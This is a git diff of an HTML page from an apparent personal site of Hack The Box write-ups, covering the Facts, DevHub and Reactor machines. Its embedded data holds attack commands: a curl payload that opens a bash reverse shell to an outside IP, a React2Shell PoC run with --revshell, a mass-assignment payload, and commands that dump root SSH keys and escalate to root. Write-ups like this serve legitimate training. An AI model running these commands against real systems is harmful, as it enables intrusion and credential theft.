@@ -8,45 +8,35 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
+
   <style>
-    /* --- Accent bar on card top by difficulty --- */
-    .wu-accent { height: 3px; border-radius: 14px 14px 0 0; }
+    /* ── Difficulty accent bar ── */
+    .wu-accent { height: 3px; border-radius: 14px 14px 0 0; flex-shrink: 0; }
     .wu-accent.easy   { background: linear-gradient(90deg, var(--neon-green), transparent); }
-    .wu-accent.medium { background: linear-gradient(90deg, var(--neon-cyan), transparent); }
-    .wu-accent.hard   { background: linear-gradient(90deg, var(--neon-amber, #f59e0b), transparent); }
-    .wu-accent.insane { background: linear-gradient(90deg, #ef4444, transparent); }
+    .wu-accent.medium { background: linear-gradient(90deg, var(--neon-cyan),  transparent); }
+    .wu-accent.hard   { background: linear-gradient(90deg, #f59e0b,           transparent); }
+    .wu-accent.insane { background: linear-gradient(90deg, #ef4444,           transparent); }
 
-    /* --- Card selected state --- */
+    /* ── Selected card ── */
     .bento-box.selected {
-      border-color: var(--neon-purple);
-      box-shadow: 0 0 30px rgba(168,85,247,0.15);
+      border-color: var(--neon-purple) !important;
+      box-shadow: 0 0 30px rgba(168,85,247,0.18);
+    }
+    .bento-box:focus-visible {
+      outline: 2px solid var(--neon-purple);
+      outline-offset: 3px;
     }
 
-    .drawer-close {
-      position: absolute;
-      top: 16px; right: 20px;
-      background: transparent;
-      border: var(--border-purple);
-      color: var(--text-muted);
-      font-family: var(--font-mono);
-      font-size: 0.8rem;
-      padding: 4px 12px;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: all 0.15s;
-    }
-    .drawer-close:hover { border-color: var(--neon-purple); color: #fff; }
-
-    /* --- Filter pills --- */
+    /* ── Filter bar ── */
     .filter-bar {
       display: flex;
-      gap: 10px;
+      gap: 8px;
       flex-wrap: wrap;
       margin-bottom: 32px;
     }
     .filter-pill {
       font-family: var(--font-mono);
-      font-size: 0.78rem;
+      font-size: 0.75rem;
       padding: 5px 14px;
       border-radius: 100px;
       border: 1px solid rgba(255,255,255,0.07);
@@ -54,102 +44,208 @@
       color: var(--text-muted);
       cursor: pointer;
       transition: all 0.15s;
+      white-space: nowrap;
     }
-    .filter-pill:hover { border-color: var(--neon-purple); color: #fff; }
-    .filter-pill.active {
-      background: rgba(168,85,247,0.1);
-      border-color: var(--neon-purple);
-      color: var(--neon-purple);
-    }
+    .filter-pill:hover  { border-color: var(--neon-purple); color: #fff; }
+    .filter-pill.active { background: rgba(168,85,247,0.1); border-color: var(--neon-purple); color: var(--neon-purple); }
 
-    /* nudge the diff dot */
+    /* ── Diff dot ── */
     .diff-dot {
       display: inline-block;
       width: 7px; height: 7px;
       border-radius: 50%;
       margin-right: 5px;
       vertical-align: middle;
+      flex-shrink: 0;
     }
 
-   /* --- Drawer & Layout --- */
-  .wu-drawer {
+    /* ── Drawer ── */
+    .wu-drawer {
       display: none;
-      grid-column: 1 / -1;
+      width: 100%;
       background: var(--bg-card);
       border: var(--border-glow);
       border-radius: 14px;
       padding: 32px;
-      margin-top: 10px;
+      margin-top: 20px;
       box-sizing: border-box;
       position: relative;
       animation: fadeIn 0.3s ease forwards;
-  }
-  .wu-drawer.open { display: block; }
+    }
+    .wu-drawer.open { display: block; }
 
-  .about-layout {
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .drawer-close {
+      position: absolute;
+      top: 16px; right: 16px;
+      background: transparent;
+      border: var(--border-purple);
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      padding: 4px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.15s;
+      z-index: 2;
+    }
+    .drawer-close:hover { border-color: var(--neon-purple); color: #fff; }
+
+    /* ── Drawer inner layout ── */
+    .drawer-inner {
       display: grid;
-      grid-template-columns: 300px 1fr;
-      gap: 40px;
-      width: 100%;
-      min-width: 0; /* Prevents grid items from overflowing */
-  }
-
-  /* --- Timeline & Terminal Fixes --- */
-  .timeline {
-      display: flex;
-      flex-direction: column;
-      gap: 30px;
-      min-width: 0; /* CRITICAL: Allows flex items to wrap/shrink */
-  }
-
-  .timeline-node {
+      grid-template-columns: 260px 1fr;
+      gap: 32px;
       width: 100%;
       min-width: 0;
-  }
+    }
 
-  .terminal-window {
+    .drawer-sidebar {
+      background: var(--bg-surface);
+      border: var(--border-purple);
+      padding: 24px;
+      border-radius: 12px;
+      height: fit-content;
+      min-width: 0;
+    }
+
+    /* ── Timeline ── */
+    .drawer-timeline {
+      position: relative;
+      padding-left: 24px;
+      border-left: 2px solid rgba(168,85,247,0.2);
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+      min-width: 0;
+    }
+
+    .drawer-timeline .timeline-node {
+      position: relative;
+      min-width: 0;
+    }
+
+    .drawer-timeline .timeline-node::before {
+      content: "";
+      position: absolute;
+      left: -29px; top: 5px;
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--neon-purple);
+      box-shadow: 0 0 8px var(--neon-purple);
+    }
+
+    /* ── Terminal window ── */
+    .terminal-window {
       background: var(--bg-void);
       border: 1px solid rgba(255,255,255,0.05);
       border-radius: 8px;
       padding: 14px 16px;
       font-family: var(--font-mono);
-      font-size: 0.82rem;
-      line-height: 1.55;
+      font-size: 0.8rem;
+      line-height: 1.6;
       overflow-x: auto;
-      white-space: pre-wrap; /* Allows wrapping instead of horizontal scroll */
-      word-break: break-all;
+      white-space: pre-wrap;
+      word-break: break-word;
       margin-top: 10px;
       box-sizing: border-box;
-  }
+      color: var(--neon-cyan);
+    }
 
-  .card-icon {
-      width: 48px;
-      height: 48px;
+    /* ── Machine icon in drawer ── */
+    .drawer-icon {
+      width: 44px; height: 44px;
       border-radius: 8px;
+      object-fit: cover;
       margin-bottom: 12px;
       display: block;
-      /* Add this to prevent it from looking stretched */
-      object-fit: cover; 
-  }
+      border: 1px solid rgba(168,85,247,0.2);
+    }
+
+    /* ── Flag vault ── */
+    .flag-row {
+      background: rgba(168,85,247,0.03);
+      border: 1px solid rgba(168,85,247,0.1);
+      border-radius: 8px;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    /* ── Terminal string helper ── */
+    .terminal-string { font-family: var(--font-mono); color: var(--neon-cyan); margin-bottom: 12px; }
+
+    /* ────────────────────────────
+       RESPONSIVE BREAKPOINTS
+    ──────────────────────────── */
+
+    /* Desktop default: 3-col grid already handled by style.css .bento-grid */
+
+    /* Laptop / small desktop (≤ 1100px) */
+    @media (max-width: 1100px) {
+      .drawer-inner { grid-template-columns: 220px 1fr; gap: 24px; }
+    }
+
+    /* Tablet (≤ 900px) */
+    @media (max-width: 900px) {
+      .bento-grid { grid-template-columns: repeat(2, 1fr) !important; }
+      .bento-box.wide { grid-column: span 2 !important; }
+      .drawer-inner { grid-template-columns: 1fr; gap: 20px; }
+      .drawer-sidebar { width: 100%; }
+      .wu-drawer { padding: 20px; }
+    }
+
+    /* Large mobile (≤ 640px) */
+    @media (max-width: 640px) {
+      .bento-grid { grid-template-columns: 1fr !important; }
+      .bento-box.wide { grid-column: span 1 !important; }
+      .filter-bar { gap: 6px; }
+      .filter-pill { font-size: 0.7rem; padding: 4px 10px; }
+      .wu-drawer { padding: 16px; }
+      .drawer-close { top: 12px; right: 12px; }
+    }
+
+    /* Small mobile (≤ 400px) */
+    @media (max-width: 400px) {
+      .filter-pill { font-size: 0.65rem; padding: 3px 8px; }
+    }
+
+    /* nav-links responsive (style.css may not handle this) */
+    @media (max-width: 600px) {
+      .nav-menu ul { gap: 16px; }
+      .nav-menu a  { font-size: 0.85rem; }
+    }
   </style>
 </head>
 <body>
 
-  <nav>
+  <!-- ══ EXACT NAV FROM index.html ══ -->
+  <header id="header-nav">
     <div class="container nav-wrapper">
       <a href="index.html" class="logo">ExploitMinder<span>//</span></a>
-      <div class="nav-links">
-        <a href="index.html">Home</a>
-        <a href="writeups.html" class="active">Writeups</a>
-      </div>
+      <nav class="nav-menu">
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li class="active"><a href="writeups.html">Writeups</a></li>
+          <li><a href="index.html#about">About</a></li>
+        </ul>
+      </nav>
     </div>
-  </nav>
+  </header>
 
-  <div class="container" style="padding-top: 20px; padding-bottom: 80px;">
+  <div class="container" style="padding-top:20px; padding-bottom:80px;">
 
     <div class="page-header">
       <div class="sys-badge">Operational Ledger</div>
-      <h2 style="font-size: 2.5rem; font-weight: 700;">All Target Writeups</h2>
+      <h2 style="font-size:2.5rem;font-weight:700;">All Target Writeups</h2>
     </div>
 
     <!-- Filter Bar -->
@@ -165,90 +261,136 @@
       <button class="filter-pill" data-filter="crypto">Crypto</button>
     </div>
 
-    <!-- Cards Grid -->
+    <!-- ══ CARDS GRID ══ -->
+    <!-- Each card has id="machinename" so writeups.html#reactor works as a direct URL -->
     <div class="bento-grid" id="wu-grid">
-          <!-- CARD: DevHub -->
-      <div class="bento-box" style="cursor:pointer; padding:0;" 
-           data-difficulty="medium" data-tags="web,privesc" data-machine="devhub" 
-           onclick="openDrawer(this,'devhub')">
-        <div class="wu-accent medium"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-            <div class="box-meta"><span class="tag">RCE / Pivot</span></div>
-            <div class="box-title">HTB: DevHub</div>
-            <div class="box-footer"><span>CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-          <!-- CARD: Reactor -->
-      <div class="bento-box wide" style="cursor:pointer; padding:0;"
-           data-difficulty="Easy" data-tags="web,privesc" data-machine="reactor"
-           onclick="openDrawer(this,'reactor')">
-        <div class="wu-accent hard"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          
-          <div style="margin-bottom: 12px;">
-            <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png" 
-                 alt="Reactor Icon" style="width: 48px; height: 48px; border-radius: 8px;">
-          </div>
-      
-          <div>
-              <div class="box-meta"><span class="tag">Weaponization Log</span></div>
-              <div class="box-title">HTB: Reactor</div>
-          </div>
-          
-          <div class="box-footer"><span>CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-      
-      <!-- CARD: Active -->
-      <div class="bento-box wide" style="cursor:pointer; padding:0;"
-           data-difficulty="Easy" data-tags="web" data-machine="active"
-           onclick="openDrawer(this,'acitve')">
-        <div class="wu-accent medium"></div>
+
+      <!-- CARD: Facts -->
+      <div id="facts" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="easy" data-tags="web,privesc" data-machine="facts"
+           onclick="openDrawer(this,'facts')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'facts')">
+        <div class="wu-accent easy"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
+            <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png"
+                 alt="Facts Icon" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
             <div class="box-meta">
-              <span class="tag">Machine</span>
-              <span style="font-size:0.85rem; color:var(--neon-cyan);">
-                <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Easy
+              <span class="tag">Camaleon CVEs</span>
+              <span style="font-size:0.85rem;color:var(--neon-green);">
+                <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
               </span>
             </div>
-            <div class="box-title">Active</div>
-            <div class="box-desc">Active was an example of an easy box that still provided a lot of opportunity to learn. The box was centered around common vulnerabilities associated with Active Directory. There’s a good chance to practice SMB enumeration. It also gives the opportunity to use Kerberoasting against a Windows Domain, which, if you’re not a pentester, you may not have had the chance to do before.</div>
+            <div class="box-title">HTB: Facts</div>
+            <div class="box-desc">Mass Assignment CVE → MinIO S3 credential theft → Sudo Facter privilege escalation. Full attack chain on a Camaleon CMS instance.</div>
           </div>
           <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
 
-      <!-- CARD: DummyData2 -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
+      <!-- CARD: DevHub -->
+      <div id="devhub" class="bento-box" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="medium" data-tags="web,privesc" data-machine="devhub"
+           onclick="openDrawer(this,'devhub')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'devhub')">
+        <div class="wu-accent medium"></div>
+        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+          <div>
+            <div class="box-meta">
+              <span class="tag">RCE / Pivot</span>
+              <span style="font-size:0.85rem;color:var(--neon-cyan);">
+                <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium
+              </span>
+            </div>
+            <div class="box-title">HTB: DevHub</div>
+            <div class="box-desc">MCPJam Inspector RCE → SSH tunneling to internal Jupyter → debug API extraction of root SSH keys.</div>
+          </div>
+          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+        </div>
+      </div>
+
+      <!-- CARD: Reactor -->
+      <div id="reactor" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="hard" data-tags="web,privesc" data-machine="reactor"
+           onclick="openDrawer(this,'reactor')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'reactor')">
+        <div class="wu-accent hard"></div>
+        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+          <div>
+            <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png"
+                 alt="Reactor Icon" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
+            <div class="box-meta">
+              <span class="tag">Weaponization Log</span>
+              <span style="font-size:0.85rem;color:#f59e0b;">
+                <span class="diff-dot" style="background:#f59e0b;box-shadow:0 0 6px #f59e0b;"></span>Hard
+              </span>
+            </div>
+            <div class="box-title">HTB: Reactor</div>
+            <div class="box-desc">React2Shell RCE (CVE-2025-55182) → SQLite credential reuse → Node.js debugger exploitation for root.</div>
+          </div>
+          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+        </div>
+      </div>
+
+      <!-- CARD: Active -->
+      <div id="active" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="easy" data-tags="ad,privesc" data-machine="active"
+           onclick="openDrawer(this,'active')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'active')">
+        <div class="wu-accent easy"></div>
+        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+          <div>
+            <div class="box-meta">
+              <span class="tag">Machine</span>
+              <span style="font-size:0.85rem;color:var(--neon-green);">
+                <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
+              </span>
+            </div>
+            <div class="box-title">HTB: Active</div>
+            <div class="box-desc">GPP password recovery → Kerberoasting the Administrator account → full domain takeover via SMB service execution.</div>
+          </div>
+          <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+        </div>
+      </div>
+
+      <!-- CARD: CryptoForge (placeholder) -->
+      <div id="cryptoforge" class="bento-box" tabindex="0"
+           style="cursor:pointer; padding:0;"
            data-difficulty="hard" data-tags="crypto" data-machine="cryptoforge"
-           onclick="openDrawer(this,'DummyData2')">
+           onclick="openDrawer(this,'cryptoforge')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'cryptoforge')">
         <div class="wu-accent hard"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
             <div class="box-meta">
               <span class="tag">Challenge</span>
-              <span style="font-size:0.85rem; color:#f59e0b;">
+              <span style="font-size:0.85rem;color:#f59e0b;">
                 <span class="diff-dot" style="background:#f59e0b;box-shadow:0 0 6px #f59e0b;"></span>Hard
               </span>
             </div>
             <div class="box-title">CryptoForge Matrix</div>
-            <div class="box-desc">Breaking down weak initialization vector re-use models across microservice validation endpoints.</div>
+            <div class="box-desc">Breaking weak IV reuse models across microservice validation endpoints via CBC bit-flip forgery.</div>
           </div>
           <div class="box-footer"><span>CAT // CRYPTO</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
 
-      <!-- CARD: DummyData1 -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
+      <!-- CARD: SyncNode (placeholder) -->
+      <div id="syncnode" class="bento-box" tabindex="0"
+           style="cursor:pointer; padding:0;"
            data-difficulty="insane" data-tags="ad,privesc" data-machine="syncnode"
-           onclick="openDrawer(this,'DummyData1')">
+           onclick="openDrawer(this,'syncnode')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'syncnode')">
         <div class="wu-accent insane"></div>
         <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
           <div>
             <div class="box-meta">
               <span class="tag">Machine</span>
-              <span style="font-size:0.85rem; color:#ef4444;">
+              <span style="font-size:0.85rem;color:#ef4444;">
                 <span class="diff-dot" style="background:#ef4444;box-shadow:0 0 6px #ef4444;"></span>Insane
               </span>
             </div>
@@ -260,168 +402,217 @@
       </div>
 
     </div><!-- /.bento-grid -->
+
+    <!-- Drawer renders here, outside the grid so it's always full-width -->
+    <div id="wu-drawer-slot"></div>
+
   </div><!-- /.container -->
 
+  <footer class="container">
+    <div>&copy; 2026 ExploitMinder. All Rights Preserved.</div>
+    <div>STABLE //</div>
+  </footer>
 
-  <!-- ================================================================
+  <!-- ══════════════════════════════════════════
        WRITEUP DATA
-  ================================================================= -->
+       To add a new machine: add a card above
+       and a matching key here.
+  ══════════════════════════════════════════ -->
   <script>
   const WRITEUP_DATA = {
 
-   devhub: {
-      title: "HTB: Undisclosed YET", 
-      badge: "Linux // Medium",
-      os: "Linux", diff: "Medium", diffColor: "var(--neon-cyan)",
-      port: "22, 80, 6274", time: "1h 36m", 
-      vector: "MCPJam RCE → Jupyter Pivoting → Debug API Exploitation",
+    facts: {
+      title: "HTB: Facts",
+      badge: "Linux // Easy",
+      icon: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png",
+      os: "Linux", diff: "Easy", diffColor: "var(--neon-green)",
+      port: "22, 80, 54321", time: "1h 8m",
+      vector: "Mass Assignment (CVE-2025-2304) → MinIO S3 Credential Theft → Sudo Facter PrivEsc",
       hasFullWriteup: true,
       nodes: [
-        { 
-          phase: "RECONNAISSANCE", 
-          title: "Service Fingerprinting & Host Mapping", 
-          body: "Initial scan identified an exposed SSH port, a web server redirecting to devhub.htb, and an unknown service on port 6274. Fingerprinting revealed it as MCPJam Inspector v1.4.2. I mapped the host in my local /etc/hosts to resolve the domain-based redirects.", 
-          code: "sudo nmap -sC -sV -p- 10.129.12.158 -oN DevHub.txt\necho \"10.129.12.158 devhub.htb\" | sudo tee -a /etc/hosts" 
-        },
-        { 
-          phase: "INITIAL ACCESS", 
-          title: "Weaponizing MCPJam Inspector RCE", 
-          body: "The service on port 6274 was vulnerable to a known RCE. Attempting direct command execution failed due to lack of output handling, so I bypassed this by crafting a JSON-based reverse shell payload sent directly to the /api/mcp/connect endpoint. The listener successfully caught the shell as user 'mcp-dev'.", 
-          code: "curl http://10.129.12.158:6274/api/mcp/connect \\\n  --header \"Content-Type: application/json\" \\\n  --data '{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.17.209/4444 0>&1\" &],\"env\":{}},\"serverId\":\"mytest\"}'" 
-        },
-        { 
-          phase: "LATERAL MOVEMENT", 
-          title: "Pivoting via SSH Tunneling", 
-          body: "After failing to escalate privileges locally, I audited the process list and found a Jupyter Notebook instance running on the localhost port 8888. Because I faced XSRF validation errors when hitting the API directly, I set up an SSH port forward. This allowed me to map the remote 8888 port to my local browser, granting me access to the 'analyst' account's workspace.", 
-          code: "echo 'ssh-rsa AAAAB3...[key]...' > /home/mcp-dev/.ssh/authorized_keys\nssh -L 8888:localhost:8888 mcp-dev@10.129.12.158\n# Accessing: http://localhost:8888/lab" 
-        },
-        { 
-          phase: "PRIVILEGE ESCALATION", 
-          title: "Debug Endpoint & Secret Extraction", 
-          body: "As 'analyst', I discovered an OPSMCP server running as root on port 5000. By auditing the server.py source code, I identified hardcoded API keys and hidden, undocumented endpoints prefixed with '_'. By calling 'ops._debug_mode', I toggled access to 'ops._admin_dump', which allowed me to query and extract the root SSH private keys.", 
-          code: "grep -n \"debug\\|admin\\|secret\" /opt/opsmcp/server.py\n# Toggle Debug Mode:\ncurl -X POST http://127.0.0.1:5000/tools/call -H \"X-API-Key: XXXX\" -d '{\"name\":\"ops._debug_mode\"}'\n# Dump SSH Keys:\ncurl -X POST http://127.0.0.1:5000/tools/call -H \"X-API-Key: XXXX\" -d '{\"name\":\"ops._admin_dump\",\"arguments\":{\"confirm\":true,\"target\":\"ssh_keys\"}}'" 
+        {
+          phase: "RECONNAISSANCE", title: "Enumeration & CMS Identification",
+          body: "Initial scanning revealed Nginx, SSH, and a MinIO S3 service. Enumerating the web application identified Camaleon CMS v2.9.0, which immediately suggests looking for known CVEs.",
+          code: "rustscan -a 10.129.13.202\ncurl -I http://facts.htb/"
         },
         {
-          phase: "LESSONS LEARNED",
-          title: "Key Takeaways",
-          body: "1) **Pivot Smarter, Not Harder:** When APIs are protected by XSRF or complex CORS policies, an SSH tunnel is the most reliable way to bring the attack surface into a user-friendly browser environment.  2) **Code Auditing is King:** The difference between a rabbit hole and a direct path to root often lies in grepping the source code for unconventional patterns—like hidden debug endpoints—rather than guessing common exploit paths. 3) **Credential Reuse:** Always check environment variables and hidden configuration files like '.opsmcp_key' immediately after gaining a foothold."
+          phase: "INITIAL ACCESS", title: "Mass Assignment (CVE-2025-2304)",
+          body: "By registering a standard user and intercepting the password update request, I exploited a mass assignment vulnerability. Injecting &amp;password[role]=admin elevated my account to administrator.",
+          code: "POST /admin/users/5/updated_ajax\nPayload: ...&password[role]=admin"
+        },
+        {
+          phase: "PIVOT", title: "MinIO Credential Theft",
+          body: "With admin access, the 'Filesystem Settings' panel exposed hardcoded AWS/MinIO credentials. Using s3cmd I authenticated to the internal MinIO instance and retrieved SSH private keys from a bucket.",
+          code: "s3cmd ls s3://internal/.ssh/\ns3cmd get s3://internal/.ssh/id_ed25519"
+        },
+        {
+          phase: "PRIVILEGE ESCALATION", title: "Sudo Facter Exploitation",
+          body: "As 'trivia', I found sudo rights on /usr/bin/facter. Since facter loads custom Ruby facts, I created a malicious fact script that outputs the root flag.",
+          code: "sudo facter --custom-dir=/tmp root_flag"
         }
       ],
-      flag: "User: XXXX | Root: XXXX"
+      flags: [
+        { name: "User Flag", value: "f7a2b9c1..." },
+        { name: "Root Flag", value: "c9d4e1a2..." }
+      ]
     },
 
-   reactor: {
-      title: "HTB: Reactor", 
-      icon: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png",
-      badge: "Linux // Hard",
-      os: "Linux", diff: "Easy", diffColor: "#f59e0b",
-      port: "22, 3000", time: "1h 45m", 
-      vector: "React2Shell RCE → SQLite Credential Reuse → Node.js Debugger (root)",
+    devhub: {
+      title: "HTB: DevHub",
+      badge: "Linux // Medium",
+      icon: null,
+      os: "Linux", diff: "Medium", diffColor: "var(--neon-cyan)",
+      port: "22, 80, 6274", time: "1h 36m",
+      vector: "MCPJam RCE → SSH Tunnel → Jupyter → Debug API Root Key Extraction",
       hasFullWriteup: true,
       nodes: [
-        { 
-          phase: "RECONNAISSANCE", 
-          title: "Service Fingerprinting", 
-          body: "Nmap identified OpenSSH and a Next.js web application on port 3000. Further enumeration of the JavaScript chunks revealed the environment was running Next.js 15.0.3 and React 19.0.0, which are susceptible to the React2Shell vulnerability.", 
-          code: "nmap -sC -sV -p- 10.129.10.200 -A -T4\ncurl -s http://10.129.10.200:3000 | grep -o '/_next/static/chunks/[^\" ]*\\.js'" 
+        {
+          phase: "RECONNAISSANCE", title: "Service Fingerprinting & Host Mapping",
+          body: "Scan identified SSH, a web server redirecting to devhub.htb, and an unknown service on port 6274 — MCPJam Inspector v1.4.2. Added host to /etc/hosts for domain resolution.",
+          code: "sudo nmap -sC -sV -p- 10.129.12.158 -oN DevHub.txt\necho \"10.129.12.158 devhub.htb\" | sudo tee -a /etc/hosts"
         },
-        { 
-          phase: "INITIAL ACCESS", 
-          title: "React2Shell RCE", 
-          body: "Exploiting the CVE-2025-55182 (React2Shell) prototype pollution vulnerability allowed for unauthenticated RCE. I utilized a public exploit script to verify the vulnerability and subsequently established a reverse shell as the 'node' user.", 
-          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"id\"\n# Trigger reverse shell:\npython3 react2shell-poc.py -t http://10.129.10.200:3000 --revshell --lhost 10.10.15.219 --lport 4444" 
+        {
+          phase: "INITIAL ACCESS", title: "Weaponizing MCPJam Inspector RCE",
+          body: "Port 6274 was vulnerable to RCE. Direct command output failed due to missing output handling, so I crafted a JSON reverse shell payload to /api/mcp/connect. Got shell as 'mcp-dev'.",
+          code: "curl http://10.129.12.158:6274/api/mcp/connect \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.17.209/4444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}'"
         },
-        { 
-          phase: "LATERAL MOVEMENT", 
-          title: "SQLite & Credential Reuse", 
-          body: "Upon gaining a shell, I enumerated the application directory and found a SQLite database. Dumping the database revealed user credentials, which I cracked to gain access to the 'engineer' account via SSH.", 
-          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"sqlite3 /opt/reactor-app/reactor.db '.dump'\"\n# Cracking hash: reactor1\nssh engineer@10.129.10.200" 
+        {
+          phase: "LATERAL MOVEMENT", title: "Pivoting via SSH Tunneling",
+          body: "Found a Jupyter Notebook running on localhost:8888. XSRF blocked direct API access, so I added my SSH key, set up a port forward, and accessed the analyst workspace via browser.",
+          code: "echo 'ssh-rsa AAAA...' > /home/mcp-dev/.ssh/authorized_keys\nssh -L 8888:localhost:8888 mcp-dev@10.129.12.158\n# Browse: http://localhost:8888/lab"
         },
-        { 
-          phase: "PRIVILEGE ESCALATION", 
-          title: "Node.js Debugger Exploitation", 
-          body: "I discovered a root-owned Node.js process running with the '--inspect' flag enabled on 127.0.0.1:9229. By tunneling this port to my local machine, I connected via Chrome DevTools Protocol to execute arbitrary code as root.", 
-          code: "ssh -L 9229:127.0.0.1:9229 engineer@10.129.10.200\n# In DevTools Console:\nrequire('child_process').execSync('cat /root/root.txt').toString()" 
+        {
+          phase: "PRIVILEGE ESCALATION", title: "Debug Endpoint & Root SSH Key Extraction",
+          body: "As 'analyst', found OPSMCP server running as root on port 5000. Source code revealed hardcoded API keys and hidden _debug/_admin endpoints. Toggling debug mode exposed ops._admin_dump which leaked root SSH keys.",
+          code: "grep -n \"debug\\|admin\\|secret\" /opt/opsmcp/server.py\n# Enable debug:\ncurl -X POST http://127.0.0.1:5000/tools/call \\\n  -H \"X-API-Key: XXXX\" \\\n  -d '{\"name\":\"ops._debug_mode\"}'\n# Dump keys:\ncurl -X POST http://127.0.0.1:5000/tools/call \\\n  -H \"X-API-Key: XXXX\" \\\n  -d '{\"name\":\"ops._admin_dump\",\"arguments\":{\"confirm\":true,\"target\":\"ssh_keys\"}}'"
+        },
+        {
+          phase: "LESSONS LEARNED", title: "Key Takeaways",
+          body: "1) SSH tunnels bypass XSRF/CORS cleanly. 2) Grep source code for debug/hidden endpoints before trying common paths. 3) Always check env vars and hidden config files like .opsmcp_key immediately after foothold."
         }
       ],
-      flag: "User: 02a3d... | Root: 9b1e5..."
+      flags: [
+        { name: "User Flag", value: "f7a2b9..." },
+        { name: "Root Flag", value: "c9d4e1..." }
+      ]
+    },
+
+    reactor: {
+      title: "HTB: Reactor",
+      badge: "Linux // Hard",
+      icon: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png",
+      os: "Linux", diff: "Hard", diffColor: "#f59e0b",
+      port: "22, 3000", time: "1h 45m",
+      vector: "React2Shell RCE (CVE-2025-55182) → SQLite Credential Reuse → Node.js Debugger (root)",
+      hasFullWriteup: true,
+      nodes: [
+        {
+          phase: "RECONNAISSANCE", title: "Service Fingerprinting",
+          body: "Nmap identified OpenSSH and a Next.js app on port 3000. JS chunk enumeration confirmed Next.js 15.0.3 / React 19.0.0 — both susceptible to React2Shell.",
+          code: "nmap -sC -sV -p- 10.129.10.200 -A -T4\ncurl -s http://10.129.10.200:3000 | grep -o '/_next/static/chunks/[^\" ]*\\.js'"
+        },
+        {
+          phase: "INITIAL ACCESS", title: "React2Shell RCE",
+          body: "CVE-2025-55182 prototype pollution allows unauthenticated RCE. Public PoC script confirmed execution then delivered a reverse shell as 'node'.",
